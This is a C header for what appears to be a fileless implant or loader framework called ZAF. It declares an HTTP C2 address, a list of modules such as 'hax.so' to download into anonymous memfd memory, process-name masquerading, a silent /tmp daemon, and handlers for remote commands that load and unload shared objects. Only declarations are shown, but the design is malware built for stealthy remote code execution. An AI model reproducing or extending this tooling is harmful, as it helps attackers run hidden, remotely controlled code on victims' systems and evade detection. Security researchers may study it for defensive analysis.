// ZAF Header file

// logging 
#include "log.h"

// ps renaming
#include "spt_status.h"

#ifndef _HAVE_ZAF_H
#define _HAVE_ZAF_H


#define MAX_BUF 1024                       // command buffer
#define DAEMON_CHDIR "/tmp"                // daemon directory to operate from 
#define ZCURL_AGENT "libcurl-agent/1.0"    // UA-Agent

#define SHM_NAME " "                       // memfd:<...>
#define SHM_NAME_MAX 254                   
#define __NR_memfd_create 319              // https://code.woboq.org/qt5/include/asm/unistd_64.h.html

// Global daemon log
char *logFile="/tmp/_mf.log";              // Location of the log
int logquiet = 1;                          // 1 - no stderr whatsoever, 0 - stderr + file
FILE *fp;

// Initial modules to download to memory
char *modules[] = { "hax.so" };
//
// HTTP/S C2
char *ccurl="http://127.0.0.1:8080/";




/*** 
 *  Data structures 
 ***/

// ShMemTbl List
typedef struct node {
    char mname[SHM_NAME_MAX];
    char mpath[1024];
    char mstate[2];
    int  fd;
    struct node * next;
} node_t;

typedef struct modtbl {
    char mname[SHM_NAME_MAX];
    char mpath[1024];
    char mstate[2];
    int  fd;
} modtbl_t;
node_t * head = NULL;

// Kernel Verison: memfd_create support
typedef struct {
    int major;
    int minor;
    int memfd_supp;
} memfd_kv;
memfd_kv memfd_kv_s = {0,0,0};

// Curl Shared Memory write callback
typedef struct {
 int shm_fd;
 char shm_name[SHM_NAME_MAX];
} Shared_Mem_Fd;



/*** 
 *  Signals and handlers
 * 1 - SIGHUP
 * 2 - SIGUSR1
 * 3 - ...
 ***/
volatile sig_atomic_t sigflag  = 0; 
void setSignalHandlers(void);
void handleSig(int signo);
void doSigHup(void);
void doSigUsr1(void);
void doSigUsr2(void);
void doSigInt(void);
void doSigTerm(void);
void cleanup(int);


/*** 
 *  Functions
 ***/
int   push(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
int   push_first(node_t * head, int shm_fd, char* path, char * mname, char * mstate);
int   check_empty(node_t * head);
int   list_sz(node_t * head);
void  write_modlist(node_t * head, int sock);
int   load_mod(node_t * head, char * url);
int   unload_mod(node_t * head, char * name);
int   mark_delete_mod(node_t * head, int shm_fd);
int   processCommandReq (int sock, node_t * head);
int   backgroundDaemonLeader(void);
int   setupCmdP(void);
char* mod_name2path(node_t * head, char * name);
int   mod_name2fd(node_t * head, char * name, int loaded);
void  load_so_path(char* path);
void  doWork(void);
void  cleanup_os_resources(int shm_fd);


#endif //_HAVE_ZAF_H

